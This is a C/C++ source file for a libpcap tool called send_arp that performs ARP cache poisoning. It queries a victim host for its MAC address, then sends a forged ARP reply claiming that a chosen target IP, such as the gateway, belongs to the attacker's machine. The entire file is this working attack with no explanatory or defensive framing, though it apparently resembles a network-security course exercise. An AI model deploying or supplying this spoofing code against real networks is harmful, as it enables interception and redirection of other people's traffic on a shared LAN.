#include <pcap.h>
#include <stdio.h>
#include <stdint.h>

#include "pkt.h"

void usage(){
    printf("syntax : send_arp <interface> <sender ip> <target ip>");
    printf("sample : send_arp eth0 192.168.0.10 192.168.0.1");
}

int main(int argc, char* argv[]){
    if (argc != 4){
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    u_char packet[LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H];
    Pkt arppkt(packet);

    arppkt.getMyMac(dev);
    arppkt.getMyIp(dev);

    arppkt.setArp(ARPOP_REQUEST);
    arppkt.setMac(arppkt.ethhdr->ether_dhost, 0xff);
    arppkt.setMac(arppkt.ethhdr->ether_shost, arppkt.my_mac);
    arppkt.setMac(arppkt.arphdr->ar_sha, arppkt.my_mac);
    arppkt.arphdr->ar_sip = arppkt.my_ip;
    arppkt.setMac(arppkt.arphdr->ar_tha, static_cast<uint8_t>(0x00));
    arppkt.arphdr->ar_tip = inet_addr(argv[2]);
    pcap_sendpacket(handle, arppkt.pkt, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* p;
        int res = pcap_next_ex(handle, &header, &p);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        Pkt pkt(p);
        if(pkt.isArp()){
            if(pkt.arphdr->ar_sip == arppkt.arphdr->ar_tip && pkt.arphdr->ar_tip == arppkt.my_ip && pkt.arphdr->lah.ar_op == ntohs(ARPOP_REPLY)){
                arppkt.setMac(arppkt.ethhdr->ether_dhost, pkt.arphdr->ar_sha);
                arppkt.setMac(arppkt.arphdr->ar_tha, pkt.arphdr->ar_sha);
                break;
            }
        }
    }

    arppkt.setArp(ARPOP_REPLY);
    arppkt.setMac(arppkt.ethhdr->ether_shost, arppkt.my_mac);
    arppkt.setMac(arppkt.arphdr->ar_sha, arppkt.my_mac);
    arppkt.arphdr->ar_sip = inet_addr(argv[3]);
    arppkt.arphdr->ar_tip = inet_addr(argv[2]);
    pcap_sendpacket(handle, arppkt.pkt, LIBNET_ETH_H+LIBNET_ARP_ETH_IP_H);
    printf("Success!\n");
    pcap_close(handle);
    return 0;
}
